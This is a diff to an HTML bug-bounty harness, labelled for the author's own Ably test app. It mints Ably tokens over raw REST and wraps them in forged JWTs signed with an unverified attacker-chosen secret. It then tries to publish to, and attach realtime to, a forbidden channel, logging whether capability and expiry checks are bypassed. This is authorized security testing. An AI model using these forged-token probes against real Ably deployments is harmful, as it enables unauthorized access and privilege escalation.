@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Ably A2.7 harness (own test app only)</title>
+<title>Ably A2.7 harness v2 (SDK-free, own test app only)</title>
 <style>body{font-family:monospace;margin:16px}input{width:420px}pre{background:#f4f4f4;padding:12px;overflow:auto;white-space:pre-wrap}</style>
 </head>
 <body>
-<h3>Ably A2.7 — embedded-JWT outer-claim confusion (own test app bugbountyably only)</h3>
-<p>Paste ROOT API key as <code>name:secret</code>, then click Run. The key is used only in this page to call rest.ably.io; it is never sent anywhere else.</p>
+<h3>Ably A2.7 v2 — embedded-JWT outer-claim confusion (own test app bugbountyably only)</h3>
+<p>SDK-free: tokens are minted with raw REST (TokenRequest HMAC signing per ably-js), realtime attach uses a raw WebSocket. Paste ROOT API key as <code>name:secret</code>, then click Run. The key is used only in this page to call rest.ably.io / realtime.ably.io; it is never sent anywhere else.</p>
 <input id="key" type="password" placeholder="appId.keyId:secret" autocomplete="off">
 <button id="run">Run A2.7</button>
 <span id="status"></span>
@@ -19,24 +19,52 @@ document.getElementById('run').addEventListener('click', async () => {
   const status = document.getElementById('status');
   const pre = document.getElementById('r2s5-results');
   btn.disabled = true; status.textContent = 'Running...';
-  pre.textContent = 'A2.7 running...\n';
+  pre.textContent = 'A2.7 v2 (SDK-free) running...\n';
   const log = (...a) => { const s = a.map(x => typeof x === 'string' ? x : JSON.stringify(x)).join(' '); pre.textContent += s + '\n'; console.log(...a); };
   const sleep = ms => new Promise(r => setTimeout(r, ms));
   try {
-    if (typeof Ably === 'undefined') {
-      await new Promise((res, rej) => { const s = document.createElement('script'); s.src = 'https://cdn.ably.com/lib/ably.min-2.js'; s.onload = res; s.onerror = () => rej(new Error('ably.js load failed')); document.head.appendChild(s); });
-    }
-    log('Ably loaded: ' + typeof Ably);
     const ks = document.getElementById('key').value.trim();
     if (!ks || ks.indexOf(':') < 0) { log('ABORT: no key'); status.textContent = 'Aborted (no key).'; btn.disabled = false; return; }
     const ci = ks.indexOf(':'); const ROOT = { name: ks.slice(0, ci), secret: ks.slice(ci + 1) };
     const REST = 'https://rest.ably.io';
     const b64url = b => btoa(String.fromCharCode(...new Uint8Array(b))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
     const b64urlStr = s => b64url(new TextEncoder().encode(s));
-    async function hs256(msg, secret) { const k = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']); return b64url(await crypto.subtle.sign('HMAC', k, new TextEncoder().encode(msg))); }
+    const b64std = b => btoa(String.fromCharCode(...new Uint8Array(b)));
+    async function hs256raw(msg, secret) { const k = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']); return await crypto.subtle.sign('HMAC', k, new TextEncoder().encode(msg)); }
+    async function hs256(msg, secret) { return b64url(await hs256raw(msg, secret)); }
+    function c14n(cap) { if (!cap) return ''; const out = {}; Object.keys(cap).sort().forEach(k => { out[k] = [...cap[k]].sort(); }); return JSON.stringify(out); }
+    async function mintToken(key, { clientId = '', capability = null, ttl = 3600000 } = {}) {
+      const timestamp = Date.now();
+      const nonce = [...crypto.getRandomValues(new Uint8Array(8))].map(b => b.toString(16).padStart(2, '0')).join('');
+      const capStr = c14n(capability);
+      const signText = key.name + '\n' + ttl + '\n' + capStr + '\n' + clientId + '\n' + timestamp + '\n' + nonce + '\n';
+      const mac = b64std(await hs256raw(signText, key.secret));
+      const body = { keyName: key.name, ttl, capability: capStr, timestamp, nonce, mac };
+      if (clientId) body.clientId = clientId;
+      const r = await fetch(REST + '/keys/' + encodeURIComponent(key.name) + '/requestToken', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': 'Basic ' + btoa(key.name + ':' + key.secret) }, body: JSON.stringify(body) });
+      const text = await r.text();
+      if (r.status !== 200 && r.status !== 201) throw new Error('requestToken failed ' + r.status + ' ' + text.slice(0, 300));
+      return JSON.parse(text).token;
+    }
     async function restCall(method, path, { token = null, key = null, body = null } = {}) { const h = { 'Content-Type': 'application/json' }; if (token) h['Authorization'] = 'Bearer ' + token; if (key) h['Authorization'] = 'Basic ' + btoa(key.name + ':' + key.secret); const r = await fetch(REST + path, { method, headers: h, body: body ? JSON.stringify(body) : null }); const text = await r.text(); let json = null; try { json = JSON.parse(text); } catch {} return { status: r.status, json, text, errCode: r.headers.get('X-Ably-Errorcode') }; }
-    const rest1 = new Ably.Rest({ key: ROOT.name + ':' + ROOT.secret });
-    const narrowTok = (await rest1.auth.requestToken(await rest1.auth.createTokenRequest({ clientId: 'mallory', capability: { 'r2s5-allowed': ['subscribe'] } }))).token;
+    function wsAttach(token, channel, timeoutMs = 15000) {
+      return new Promise((resolve) => {
+        let ws;
+        try { ws = new WebSocket('wss://realtime.ably.io/?access_token=' + encodeURIComponent(token) + '&v=2&format=json'); } catch (e) { resolve({ attached: false, error: 'ws-construct: ' + e.message }); return; }
+        let done = false;
+        const timer = setTimeout(() => finish({ attached: false, error: 'timeout waiting for attach result' }), timeoutMs);
+        const finish = (res) => { if (done) return; done = true; clearTimeout(timer); try { ws.close(); } catch {} resolve(res); };
+        ws.onmessage = (ev) => {
+          let m; try { m = JSON.parse(ev.data); } catch { return; }
+          if (m.action === 4) { ws.send(JSON.stringify({ action: 10, channel })); return; }
+          if (m.action === 11 && m.channel === channel) { finish({ attached: true }); return; }
+          if (m.action === 9) { finish({ attached: false, error: 'ERROR ' + JSON.stringify(m.error) }); return; }
+        };
+        ws.onerror = () => finish({ attached: false, error: 'websocket error' });
+        ws.onclose = (e) => { if (!done) finish({ attached: false, error: 'ws closed code=' + e.code + ' reason=' + (e.reason || '') }); };
+      });
+    }
+    const narrowTok = await mintToken(ROOT, { clientId: 'mallory', capability: { 'r2s5-allowed': ['subscribe'] } });
     log('narrow token issued (clientId mallory, r2s5-allowed subscribe).');
     async function embed(inner, { outerClaims = {}, outerHeader = {}, putInPayload = false } = {}) { const now = Math.floor(Date.now() / 1000); const header = { typ: 'JWT', alg: 'HS256', ...(putInPayload ? {} : { 'x-ably-token': inner }), ...outerHeader }; const claims = { iat: now, exp: now + 3600, ...(putInPayload ? { 'x-ably-token': inner } : {}), ...outerClaims }; const u = b64urlStr(JSON.stringify(header)) + '.' + b64urlStr(JSON.stringify(claims)); return u + '.' + await hs256(u, 'attacker-chosen-secret-nobody-verifies'); }
     async function embedConflict(headerTok, payloadTok, outerClaims = {}) { const now = Math.floor(Date.now() / 1000); const header = { typ: 'JWT', alg: 'HS256', 'x-ably-token': headerTok }; const claims = { iat: now, exp: now + 3600, 'x-ably-token': payloadTok, ...outerClaims }; const u = b64urlStr(JSON.stringify(header)) + '.' + b64urlStr(JSON.stringify(claims)); return u + '.' + await hs256(u, 'attacker-chosen-secret-nobody-verifies'); }
@@ -70,7 +98,7 @@ document.getElementById('run').addEventListener('click', async () => {
       log('[TEST4a] x-ably-token in PAYLOAD claim publish to r2s5-forbidden => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300) + ' VERDICT: ' + (r.status === 201 ? 'VULNERABLE' : (r.status === 401 || r.status === 403) ? 'SAFE (DENY)' : 'OTHER ' + r.status));
       if (r.status === 201) { vuln = true; stop(); }
       if (!vuln) {
-        const rootTok = (await rest1.auth.requestToken(await rest1.auth.createTokenRequest({ capability: { '*': ['*'] } }))).token;
+        const rootTok = await mintToken(ROOT, { capability: { '*': ['*'] } });
         const w4b = await embedConflict(narrowTok, rootTok);
         r = await restCall('POST', '/channels/r2s5-forbidden/publish', { token: w4b, body: { name: 'x', data: 'pwn' } });
         log('[TEST4b] CONFLICT header=narrow payload=root publish to r2s5-forbidden => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300) + ' VERDICT: ' + (r.status === 201 ? 'VULNERABLE (payload/root token won)' : (r.status === 401 || r.status === 403) ? 'SAFE (header/narrow won or payload ignored)' : 'OTHER ' + r.status));
@@ -89,7 +117,9 @@ document.getElementById('run').addEventListener('click', async () => {
       await sleep(61000);
       r = await restCall('POST', '/channels/r2s5-forbidden/publish', { token: w5short, body: { name: 'x', data: 'pwn' } });
       log('[TEST5b] after 61s reuse (outer expired, inner valid) publish to r2s5-forbidden => status=' + r.status + ' errCode=' + r.errCode + ' body=' + r.text.slice(0, 300) + ' VERDICT: ' + ((r.status === 401 || r.status === 403) && r.errCode === fresh.errCode ? 'expiry NOT visibly enforced (same error as fresh) - check realtime attach below' : (r.status === 401 || r.status === 403) ? 'rejected with different error - outer exp may be enforced' : 'OTHER ' + r.status));
-      try { const rt5 = new Ably.Realtime({ token: w5short }); const ch5 = rt5.channels.get('r2s5-allowed'); await ch5.attach(); log('[TEST5b-rt] realtime attach r2s5-allowed with expired-outer token => ATTACHED (expiry bypass VULNERABLE)'); await rt5.close(); } catch (e) { log('[TEST5b-rt] realtime attach r2s5-allowed with expired-outer token => FAILED (outer exp enforced, SAFE): ' + (e && e.message ? e.message : e) + ' code=' + (e && e.code)); }
+      const a5 = await wsAttach(w5short, 'r2s5-allowed');
+      log('[TEST5b-rt] realtime attach r2s5-allowed with expired-outer token => ' + (a5.attached ? 'ATTACHED (expiry bypass VULNERABLE)' : 'FAILED (outer exp enforced or ws inconclusive, SAFE unless ws error): ' + (a5.error || '')));
+      if (a5.attached) { vuln = true; stop(); }
     }
     if (!vuln) {
       const now6 = Math.floor(Date.now() / 1000);
@@ -99,13 +129,9 @@ document.getElementById('run').addEventListener('click', async () => {
       if (r.status === 201) { vuln = true; stop(); }
     }
     if (!vuln) {
-      try {
-        const rt = new Ably.Realtime({ token: w1 });
-        const ch = rt.channels.get('r2s5-forbidden');
-        await ch.attach();
-        log('[TEST7] realtime attach r2s5-forbidden with TEST1 token => ATTACHED (VULNERABLE confirmation) state=' + ch.state);
-        await rt.close();
-      } catch (e) { log('[TEST7] realtime attach r2s5-forbidden with TEST1 token => FAILED as expected (SAFE): ' + (e && e.message ? e.message : e) + ' code=' + (e && e.code)); }
+      const a7 = await wsAttach(w1, 'r2s5-forbidden');
+      log('[TEST7] realtime attach r2s5-forbidden with TEST1 token => ' + (a7.attached ? 'ATTACHED (VULNERABLE confirmation)' : 'FAILED as expected (SAFE unless ws error): ' + (a7.error || '')));
+      if (a7.attached) { vuln = true; stop(); }
     }
     log('A2.7 DONE. vuln=' + vuln);
     status.textContent = 'Done. vuln=' + vuln;
